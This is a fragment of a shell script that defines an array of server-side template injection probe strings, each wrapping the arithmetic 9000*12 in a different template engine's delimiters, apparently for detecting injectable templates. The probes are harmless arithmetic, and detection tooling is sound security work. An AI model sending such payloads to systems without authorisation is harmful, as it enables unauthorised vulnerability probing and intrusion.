...
# Define the payloads
payloads=("{9000*12}" "*{9000*12}" "{{9000*12}}" "\${9000*12}" "@(9000*12)" "<?=9000*12?>" "<%= 9000*12 %>" "\${= 9000*12}" "{{= 9000*12}}" "\$\{{9000*12}}" "#{9000*12}" "[% 9000*12 %]" "<% 9000*12 %>" "[%= 9000*12 %]" "<% 9000*12 %>" "{{% 9000*12 %}}" "{{<% 9000*12 %>}}" "[[ 9000*12 ]]" "{{# 9000*12 }}" "<# 9000*12 #>" "[- 9000*12 -]" "[=9000*12]")
